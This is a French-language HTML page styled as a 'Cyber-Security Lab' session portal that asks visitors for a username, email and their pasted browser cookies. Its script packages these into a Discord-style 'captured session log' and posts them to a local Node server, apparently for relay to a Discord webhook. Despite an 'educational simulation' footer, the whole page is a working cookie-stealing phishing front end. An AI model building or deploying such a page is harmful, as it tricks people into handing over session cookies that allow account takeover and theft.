<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Cyber-Security Lab | User Portal</title>
    <style>
        :root { --neon-green: #00ff41; --dark-bg: #0d0208; --error-red: #ff3131; }
        body { 
            background: var(--dark-bg); 
            color: var(--neon-green); 
            font-family: 'Courier New', monospace; 
            margin: 0; padding: 20px; 
            display: flex; flex-direction: column; align-items: center; 
            min-height: 100vh;
        }
        
        .container { 
            max-width: 500px; width: 100%; border: 1px solid var(--neon-green); 
            padding: 30px; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); 
            margin-top: 50px; background: rgba(0, 20, 0, 0.9);
        }

        h1 { text-transform: uppercase; letter-spacing: 5px; text-align: center; border-bottom: 1px solid var(--neon-green); padding-bottom: 10px; }
        
        input, textarea { 
            background: black; border: 1px solid var(--neon-green); 
            color: var(--neon-green); width: 100%; padding: 12px; 
            margin: 10px 0; box-sizing: border-box; outline: none;
        }

        button { 
            background: var(--neon-green); color: black; border: none; 
            padding: 12px 20px; cursor: pointer; font-weight: bold; 
            width: 100%; transition: 0.3s; margin-top: 10px; text-transform: uppercase;
        }

        button:hover { background: white; box-shadow: 0 0 20px var(--neon-green); }

        #loading-zone { display: none; text-align: center; padding: 40px; }
        
        .glitch { font-size: 1.2rem; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }

        .footer-note { font-size: 0.7rem; color: #444; margin-top: 20px; text-align: center; }
        .status-msg { margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <h1>SESSION LAB v1.0</h1>

    <div id="user-view">
        <p>[SYSTEM]: En attente de synchronisation...</p>
        <input type="text" id="username" placeholder="Nom d'utilisateur">
        <input type="email" id="userEmail" placeholder="Votre Email">
        <textarea id="cookieInput" rows="4" placeholder="Collez les Cookies ici..."></textarea>
        <button onclick="processData()">INITIER LE TRANSFERT</button>
    </div>

    <div id="loading-zone">
        <div class="glitch" id="status-text">INITIALISATION DU CRYPTAGE...</div>
        <div id="progress-bar" style="margin-top: 20px; color:white;">[████████░░░░] 65%</div>
    </div>
</div>

<p class="footer-note">EDUCATIONAL SIMULATION ONLY - CYBER LABS 2026</p>

<script>
    async function processData() {
        const u = document.getElementById('username').value;
        const e = document.getElementById('userEmail').value;
        const c = document.getElementById('cookieInput').value;

        if(!u || !e) return alert("Erreur : Les champs Utilisateur et Email sont obligatoires.");

        // Animation de chargement
        document.getElementById('user-view').style.display = 'none';
        document.getElementById('loading-zone').style.display = 'block';
        const status = document.getElementById('status-text');
        const progress = document.getElementById('progress-bar');

        // Préparation du message pour Discord (via ton serveur)
        const payload = {
            embeds: [{
                title: "🚨 LOG DE SESSION CAPTURÉ 🚨",
                color: 5763719,
                fields: [
                    { name: "👤 Utilisateur", value: `\`${u}\``, inline: true },
                    { name: "📧 Email", value: `\`${e}\``, inline: true },
                    { name: "🍪 Données", value: "```" + (c || "Aucune donnée") + "```" }
                ],
                footer: { text: "Transfert via Localhost:3000 • " + new Date().toLocaleString() }
            }]
        };

        try {
            // ENVOI AU SERVEUR NODE.JS (celui qui affiche "SERVEUR ACTIF")
            const response = await fetch("http://localhost:3000/send-data", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                status.innerHTML = "<span style='color:white;'>TRANSFERT RÉUSSI</span><br><br>Données transmises avec succès.";
                progress.innerHTML = "[████████████] 100%";
                progress.style.color = "var(--neon-green)";
            } else {
                status.innerHTML = "<span style='color:var(--error-red);'>ERREUR SERVEUR</span><br>Vérifiez le lien Webhook dans server.js";
            }
        } catch (error) {
            status.innerHTML = "<span style='color:var(--error-red);'>SERVEUR HORS LIGNE</span><br><small>Relance 'node server.js' dans ton terminal.</small>";
            progress.innerHTML = "[XXXXXXXXXXXX] ERROR";
            progress.style.color = "var(--error-red)";
        }
    }
</script>

</body>
</html>
